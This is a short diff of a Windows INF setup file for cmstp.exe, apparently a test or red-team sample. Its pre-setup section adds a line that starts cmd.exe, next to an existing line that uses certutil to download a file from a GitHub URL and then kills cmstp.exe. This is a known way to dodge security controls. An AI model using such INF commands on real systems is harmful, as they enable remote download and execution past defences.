@@ -104,6 +104,7 @@ RunPostSetupCommands=RunPostUnInstCommandsSection
 
 [RunPreSetupCommandsSection]
 ; Commands Here will be run Before Setup Begins to install
+c:\windows\system32\cmd.exe
 c:\windows\system32\cmd.exe \c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/void010/dummy/main/dummy.txt c:\Temp\dummy_cmstp.txt
 taskkill /IM cmstp.exe /F
 
